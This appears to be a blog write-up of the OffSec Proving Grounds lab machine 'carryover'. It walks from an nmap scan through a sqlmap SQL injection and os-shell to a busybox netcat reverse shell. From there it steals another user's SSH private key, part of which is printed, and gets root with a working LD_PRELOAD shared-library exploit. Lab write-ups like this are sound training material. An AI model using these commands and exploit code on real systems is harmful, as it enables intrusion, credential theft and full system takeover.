difficulty: intermediate  
community rated: hard  
released: Dec 06 2024

Hey all, every now and again I like to check the new releases on the Offsec Proving Grounds. This article is about the new linux machine carryover. carryover was an intermediate box that was actually criminally easy with Sqlmap, but harder without. I used Sqlmap because now that my OSCP is over, I want to enjoy the satisfaction of using it. The machines exposed webserver was vulnerable to an sql injection in the search functionality. Using sqlmap os-shell function, I was able to get a reverse shell on the machine as www-data. After I established a working shell, I was able to harvest the local users ssh key and get a user ssh session. The path to root involved exploiting LD_Preload to obtain a root shell. Lets get started!

As always, I start with my tried and true nmap scan

`sudo nmap -sC -sV -p- --min-rate 10000 192.168.112.114 -oA nmap.out`

![Proving Grounds/carryover/nmap.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/nmap.png)

Not much to go on here, just 2 open ports common with linux webservers

port 22 | ssh | OpenSSH 9.2p1  
port 80 | http | nginx 1.22.1

This is most likely some sort of Debian based Linux machine.

Lets jump to the webpage by navigating via browser to [http://192.168.112.114](http://192.168.112.114)

![carvilla.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/carvilla.png)

Navigating to the site presents me with some kind of dealership service where your perfect car is just a click away, fat chance.

Clicking around the links don't take me anywhere. The page is incredibly static.

The only area that allow for some form of interaction is a janky search feature.

![SearchFeature.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/SearchFeature.png)

Selecting the options and then clicking search kind of breaks the page and doesn't present anything, but I think this is due to the lack of car choices. People must have taken advantage of all the unbeatable prices.

I want to get a closer look at what's going on here, Ill do this using inspector built into FireFox. I'm going to go to the network tab and click search so I can edit and resend the request to check for SQL injection.

Now for each parameter being send, I'm going to add a single quote to the end to check for any issues or instabilities.

![SQLError.gif](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/SQLError.gif)

Awesome! the "make" parameter is injectable. It looks like it running a mysql db. I'm going to copy this using Burp Suite.

![captureReq.gif](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/captureReq.gif)

Alright, I'm going to use sqlmap to exploit this injection.

`sqlmap -r request.req`

Once complete after accepting all default commands, we have the list of injections at the bottom.

![sqlinjections.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/sqlinjections.png)

I first look around the database for credentials, but the only contents are the cars.

`sqlmap -r request.req -D car_dealership --dump`

![cars.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/cars.png)

So I run `os-shell` and it successfully uploads a simple webshell for remote code execution as www-data!

`sqlmap -r request.req --os-shell`

![webshell.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/webshell.png)

Sweet, Im going to pass a reverse shell using busybox cause its just been working for me. Ill set up my listener using netcat.

```
┌──(kali㉿kali)-[~/Documents/offsec/payloads]
└─$ sudo nc -lvnp 443 
[sudo] password for kali: 
listening on [any] 443 ...
```

And run my payload

```
os-shell> busybox nc 192.168.45.248 443 -e /bin/bash
```

I have a catch!

```
┌──(kali㉿kali)-[~/Documents/offsec/payloads]
└─$ sudo nc -lvnp 443 
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.45.248] from (UNKNOWN) [192.168.112.114] 40618
```

This is a nasty shell, So I'm gonna use the standard trick to get me a solid shell.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'  
Ctrl ^Z  
stty raw -echo && fg  
reset  
screen  
export TERM=xterm  
clear
```

Now I have a solid shell! but I'm limited as www-data. I'm going to check to see if there are any ssh creds I can steal from the local user.

```
www-data@carryover:~/html$ ls /home
ogbos
www-data@carryover:~/html$ cat /home/ogbos/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAryxo4M/ZsBipierou87mnSgBEJMC958rhFyjEF33fNjb4vOTzlrj
wmj1OQNqgFD1MFQy294ryNa5+Glt52xZn9L7nw89iJVUfJm1i79dchYylkMjSiGpjmv5km
hXuGqojH6Tp2Grot6RXvbVhZD8wh3irg/AUlFuKVRj2JFeNtDbu+CHN9rAHLHamWy3nOJ0
Wn7pV8v7OhI3TrOOnwU1+uDadW1PvYPgQrnPFnJ9RxY3gMxw9rq+C9iceRc9Lz7Hw0KGEp
f9RW4FzCTCHR45JRJ2tSurda0bVuPEInCoLCCI+ZogbsVWaiRMhXUt7ckxOai4+hKEwW3N
/YWZC44yJqkGPk5zjuCv2lKxE/b8OLajv4FUO9bFfkM53YYPGwIBo0yI2pn2qJuh7O9IZI
2aBBGK7kq/T8kjJQz3qXqcizMHyUGfhJ9fyY7rFwhxZVH+T0TY1Yz/VLO+NadvujXJSntH
ioSRFSb47toDASQc3Go0cqdlUkyghNT7rBuINNTbAAAFiAlpOxoJaTsaAAAAB3NzaC1yc2
EAAAGBAK8saODP2bAYqYnq6LvO5p0oARCTAvefK4RcoxBd93zY2+Lzk85a48Jo9TkDaoBQ
9TBUMtveK8jWufhpbedsWZ/S+58PPYiVVHyZtYu/XXIWMpZDI0ohqY5r+ZJoV7hqqIx+k6
dhq6LekV721YWQ/MId4q4PwFJRbilUY9iRXjbQ27vghzfawByx2plst5zidFp+6VfL+zoS
```

Awesome! lets steal it and use it to login as ogbos.

```
vi id_rsa
i <insert>
Ctrl-V
chmod 600 id_rsa
ssh -i id_rsa ogbos@192.168.112.114
```

![shellasogbos.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/shellasogbos.png)

Nice! grab the local.txt

```
ogbos@carryover:~$ cat ~/local.txt 
08ae2210******************
```

My first impulse in search for a privilege escalation vector is `sudo -l`

![ItsOver.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/ItsOver.png)

Sweet! its all over! env_keep+=LD_PRELOAD listed as a default with a no password sudo for /usr/bin/python3 allows us to run a shared library as root. [Here](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/) is a procedure to follow to do this.

All we need to do is generate a c-program file inside the tmp directory.

```
cd /tmp
vi shell.c
```

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

![shellc.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/shellc.png)

Now, on the attacker we run the following

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/python3 /opt/event-viewer.py
```

![Proving Grounds/carryover/rootshell.png](https://publish-01.obsidian.md/access/1a97427586403fe24bd74e609455b39e/Proving%20Grounds/carryover/rootshell.png)

Its that easy!

And we grab the root flag!

```
# cat /root/proof.txt
9c8ff5c*****************
```

I have insane respect for security researchers and career hackers that figure this stuff out to make my life easy. Thank you for reading! Happy Hacking!